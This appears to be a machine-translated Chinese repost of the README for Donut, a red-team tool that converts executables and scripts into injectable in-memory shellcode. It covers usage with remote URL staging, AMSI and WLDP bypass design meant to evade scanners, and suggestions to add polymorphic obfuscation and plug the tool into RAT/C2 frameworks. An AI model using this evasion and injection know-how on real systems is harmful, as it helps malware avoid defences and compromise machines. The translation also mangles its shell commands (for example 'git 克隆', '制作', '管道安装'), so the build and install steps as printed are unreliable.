# Donut:生成 x86、x64 或 AMD64+x86 位置无关的外壳代码

> 原文：<https://kalilinuxtutorials.com/donut-x86-x64-or-amd64x86-shellcode/>

[![Donut : Generates x86, x64, or AMD64+x86 Position-Independent Shellcode](img/a6518d7c781fcfda06164f2af5f4c6ec.png "Donut : Generates x86, x64, or AMD64+x86 Position-Independent Shellcode")](https://1.bp.blogspot.com/-rTBSQdXA2Sg/XcVLdJCj-uI/AAAAAAAADWA/246ZHXuLxs8Yb9jvyWhCiei0yRpJH_HwwCLcBGAsYHQ/s1600/donut%25281%2529.png)

Donut 从 VBScript、JScript、EXE、DLL(包括。NET 程序集)文件。该外壳代码可以注入到任意 Windows 进程中，以便在内存中执行。

给定支持的文件类型、参数和入口点(如程序。Main)，它产生与位置无关的外壳代码，完全从内存中加载和运行。由它创建的模块既可以从 URL 进行暂存，也可以通过直接嵌入外壳代码进行无暂存。

无论哪种方式，模块都是用 Chaskey 块密码和一个 128 位随机生成的密钥加密的。通过 PE/ActiveScript/CLR 加载程序加载文件后，将从内存中删除原始引用以阻止内存扫描程序。

因为。NET 程序集，它们将被加载到新的应用程序域中，以允许在可处置的 AppDomains 中运行程序集。

它可以有多种用途。

**又读-[Trivy:Simple&综合漏洞扫描器](http://kalilinuxtutorials.com/trivy-comprehensive-vulnerability-scanner/)**

**作为独立工具**

它可以用来从 VBS/JS/EXE/DLL 文件或。NET 程序集。为加载器生成提供了 Linux 和 Windows 可执行文件以及 Python 模块。Python 文档可以在这里找到[。命令行语法如下所述。](https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.md)

```
usage: donut [options] -f <EXE/DLL/VBS/JS>

       Only the finest artisanal donuts are made of shells.

                   -MODULE OPTIONS-

       -f <path>            .NET assembly, EXE, DLL, VBS, JS file to execute in-memory.
       -n <name>            Module name. Randomly generated by default.
       -w                   Command line is passed to unmanaged DLL function as ANSI. (default is UNICODE)
       -u <URL>             HTTP server that will host the donut module.

                   -PIC/SHELLCODE OPTIONS-

       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default).
       -b <level>           Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)
       -o <output_file      Output file. Default is "loader.bin"
       -e                   Output in the specified format. 0=raw, 1=base64 (Will be copied to clipboard on Windows), 2=c, 3=ruby, 4=python, 5=powershell, 6=C#, 7=hex)
       -t                   Run entrypoint for unmanaged EXE as a new thread. (replaces ExitProcess with ExitThread in IAT)
       -x                   Call RtlExitUserProcess to terminate the host process. (RtlExitUserThread is called by default)

                   -DOTNET OPTIONS-

       -c <namespace.class> Optional class name.  (required for .NET DLL)
       -m <method | api>    Optional method or API name for DLL. (a method is required for .NET DLL)
       -p <parameters>      Optional parameters inside quotations.
       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.
       -d <name>            AppDomain name to create for .NET. Randomly generated by default.

 examples:

    donut -f c2.dll
    donut -a1 -cTestClass -mRunProcess -pnotepad.exe -floader.dll
    donut -f loader.dll -c TestClass -m RunProcess -p"calc notepad" -u http://remote_server.com/modules/ 
```

**大楼**

它的每个发布版本都提供了包含已编译的可执行文件的标签。

*   v0.9.2，熊爪:[https://github.com/TheWover/donut/releases/tag/v0.9.2](https://github.com/TheWover/donut/releases/tag/v0.9.2)
*   测试版:[https://github.com/TheWover/donut/releases/tag/v0.9.2](https://github.com/TheWover/donut/releases/tag/v0.9.2)
*   v0.9.1、苹果熔块:[https://github.com/TheWover/donut/releases/tag/v0.9.1](https://github.com/TheWover/donut/releases/tag/v0.9.1)
*   v0.9，初始版本:[https://github.com/TheWover/donut/releases/tag/v0.9](https://github.com/TheWover/donut/releases/tag/v0.9)

但是，您也可以使用提供的 makefiles 自己克隆和构建源代码。

**从存储库构建**

从 Windows 命令提示符或 Linux 终端，克隆存储库并切换到工具目录。

**git 克隆 http://github.com/thewover/donut
CD 甜甜圈**

**Linux**

只需运行 make 生成一个可执行的静态和动态库。

**制作
制作清洁
制作调试**

**窗户**

启动 Microsoft Visual Studio Developer 命令提示符并`cd`到 donut 的目录。Microsoft(非 gcc) Makefile 可以用`**-f Makefile.msvc**`指定。makefile 提供了以下命令来构建 donut:

**nmake-f makefile . msvc
nmake clean-f makefile . msvc
nmake debug-f makefile . msvc**

**作为图书馆**

它可以被编译成适用于两种 Linux 的动态和静态库。a /。所以)和 Windows(。lib /。dll)。它有一个在 docs/api.html 中描述的简单 API，提供了两个导出函数:`**int DonutCreate(PDONUT_CONFIG c)**`和`**int DonutDelete(PDONUT_CONFIG c)**`。

**作为 Python 模块**

Donut 可以作为 Python 模块安装和使用。要从当前目录安装 Donut，请使用 pip for Python3。

管道安装。

否则，您可以通过从 PyPi 库中获取 Donut 来将其安装为 Python 模块。

**pip 安装 donut-shellcode**

**作为模板–重建外壳代码**

*loader/* 包含 EXE/DLL/VBS/JS 和的内存中执行代码。NET 程序集，这应该可以成功地与微软的 Visual Studio 和 MinGW w64 编译。两个编译器都提供了 Make 文件。每当 loader 目录中的文件发生变化时，建议在重新构建 donut 之前对所有架构进行重新编译。

**微软 Visual Studio**

由于 MSVC 编译器的最新变化，我们现在仅支持 2019 版及更高版本。

打开 x64 Microsoft Visual Studio 构建环境，切换到*加载程序*目录，并键入以下内容:

**nmake clean-f makefile . msvc
nmake-f makefile . msvc**

这将从 loader.c 中生成一个 64 位可执行文件(loader.c)。PE 文件的文本段，并将其作为 C 数组保存到 loader_exe_x64.h。当 donut 重新构建时，这个新的外壳代码将用于它生成的所有加载程序。

要生成 32 位外壳代码，请打开 x86 Microsoft Visual Studio 构建环境，切换到 loader 目录，然后键入以下内容:

**nmake clean-f makefile . msvc
nmake x86-f makefile . msvc**

这会将外壳代码作为 C 数组保存到 *loader_exe_x86.h* 。

**MinGW-W64**

假设你在 Linux 上，MinGW-W64 已经从软件包或源代码中安装，你仍然可以使用我们提供的 makefile 来重新构建外壳代码。转到加载程序目录，并键入以下内容:

make-f makefile . mingw
make-f makefile . mingw

一旦你重新编译了所有的架构，你就可以重建 donut 了。

**旁路**

甜甜圈包括 AMSI 和其他安全功能的旁路系统。目前我们绕过:

*   AMSI 在。网络 4.8 版
*   防止动态生成的代码执行的设备保护策略

您可以自定义我们的旁路或添加您自己的旁路。旁路逻辑在 loader/bypass.c 中定义。

每个旁路用签名`**BOOL DisableAMSI(PDONUT_INSTANCE inst)**`实现 DisableAMSI 函数，并带有相应的处理器指令。我们有几个检查定义的`#if defined`块。每个模块实现相同的旁路功能。例如，我们的第一个旁路叫做`BYPASS_AMSI_A`。如果 donut 是用定义的那个变量构建的，那么将使用那个旁路。

为什么要这样做？因为这意味着只有你使用的旁路是 loader.exe 内置的。因此，其他的不包括在你的外壳代码中。这减少了外壳代码的大小和复杂性，增加了设计的模块化，并确保扫描器无法在外壳代码中找到您实际上没有使用的可疑块。

这种设计的另一个好处是你可以编写自己的 AMSI 旁路。要用您的新旁路构建 Donut，请为您的旁路使用一个`if defined`块，并修改 makefile 以添加一个用您定义的旁路名称构建的选项。

如果您愿意，可以扩展我们的 bypass 系统，添加在您的之前运行的其他预执行逻辑。NET 程序集已加载。

Odzhan 写了一篇关于我们 AMSI 旁路研究细节的博文。

**附加功能**

这些留给读者作为练习。我个人建议:

*   添加环境键控
*   每次生成外壳代码时，通过混淆*加载程序*使甜甜圈多态
*   将 donut 作为一个模块集成到您最喜欢的 RAT/C2 框架中

**免责声明**

*   不，我们不会更新甜甜圈，以对抗任何反病毒的签名或检测。
*   我们对该软件或技术的任何误用概不负责。Donut 是通过外壳代码提供的 CLR 注入演示，目的是为 red teamers 提供一种模拟对手和防御者的方法，为构建分析和缓解措施提供一个参考框架。这不可避免地存在恶意软件作者和威胁参与者滥用它的风险。然而，我们认为净收益大于风险。希望这是正确的。

**工作原理**

**装配程序**

Donut 使用非托管 CLR 宿主 API 来加载公共语言运行库。如有必要，程序集将被下载到内存中。无论哪种方式，都使用 Chaskey 块密码进行解密。一旦 CLR 被加载到宿主进程中，除非另外指定，否则将使用随机名称创建一个新的 AppDomain。一旦 AppDomain 准备就绪。NET 程序集是通过 AppDomain 加载的。Load_3。最后，用任何指定的参数调用用户指定的入口点。

上面的逻辑描述了 donut 生成的外壳代码是如何工作的。这个逻辑在 loader.exe 的*中定义。为了获取外壳代码， *exe2h* 从*中提取编译后的机器码。文本*段在*loader.exe*中，并将其作为 C 数组保存到 C 头文件中。 *donut* 将外壳代码与一个 donut 实例(外壳代码的配置)和一个 Donut 模块(包含。NET 程序集、类名、方法名和任何参数)。*

有关未记录的 CLR 托管 API 的文档，请参考 MSDN:[https://docs . Microsoft . com/en-us/dot net/framework/unmanaged-API/Hosting/CLR-Hosting-interfaces](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces)

关于 CLR 主机的独立示例，请参考凯西·史密斯的汇编加载器报告:[https://github.com/caseysmithrc/AssemblyLoader](https://github.com/caseysmithrc/AssemblyLoader)

Odzhan 和 TheWover 的博客上都有关于 donut 如何工作的详细博文。链接位于自述文件的顶部。

**active script/XSL 的过程**

Odzhan 在一篇博客文章中详细描述了 Donut 如何从内存中加载脚本和 XSL 文件。

**PE 加载程序**

Odzhan 在一篇博客文章中详细描述了 Donut 如何从内存中加载 PE 文件。

仅包含重定位信息的 PE 文件(。reloc)被支持。TLS 回调只在进程创建时执行。

**组件**

Donut 包含以下元素:

*   donut . c:donut loader 生成器的源代码。
*   donut.exe:作为 exe 文件的已编译加载程序生成器。
*   donut.py:作为 Python 脚本的 donut loader 生成器(计划在 1.0 版本中发布)
*   Donut module . c:Donut 的 CPython 包装器。由 Python 模块使用。
*   setup.py:安装 Donut 作为 Pip Python3 模块的安装文件。
*   lib/donut.dll，lib/donut.lib: Donut 作为一个动态和静态库，用于 Windows 平台上的其他项目。
*   lib/donut.so，lib/donut.a: Donut 作为一个动态和静态库，用于 Linux 平台上的其他项目。
*   lib/donut.h:在 C/C++项目中使用静态或动态库时要包含的头文件。
*   loader/loader.c:外壳代码的主文件。
*   loader/inmem_dotnet.c:的内存加载器。NET EXE/DLL 程序集。
*   loader/In mem _ PE . c:EXE/DLL 文件的内存加载程序。
*   loader/In mem _ script . c:VBScript/JScript 文件的内存加载器。
*   loader/activescript.c:内存中执行 VBS/JS 文件所需的 ActiveScriptSite 接口。
*   loader/wscript.c:支持 cscript/wscript 支持的许多 wscript 方法。
*   loader/bypass.c:绕过反恶意软件扫描界面(AMSI)和 Windows 本地设备策略(WLDP)的功能。
*   loader/http_client.c:将模块从远程临时服务器下载到内存中。
*   loader/peb.c:用于通过进程环境块(peb)解析 DLL 函数的地址。
*   loader/clib.c:取代了常见的 C 库函数，如 memcmp、memcpy 和 memset。
*   loader/inject.exe:编译好的 C shellcode 注入器。
*   loader/inject.c:将 loader.bin 注入指定进程进行测试的 C shellcode 注入器。
*   loader/runsc.c:一个 C shellcode 代码运行程序，用于以尽可能简单的方式测试 loader.bin。
*   loader/runsc.exe:编译后的 C shellcode runner。
*   loader/exe2h/exe2h . c:exe2h 的源代码。
*   loader/exe2h/exe2h.exe:从 loader.exe 中提取有用的机器码，以数组的形式保存到 C 头文件中。
*   encrypt.c:用于加密的计数器(CTR)模式下的 Chaskey 128 位分组密码。
*   hash.c: Maru 哈希函数。使用具有 Davies-Meyer 构造的 Speck 64 位分组密码进行 API 哈希运算。

[**Download**](https://github.com/TheWover/donut)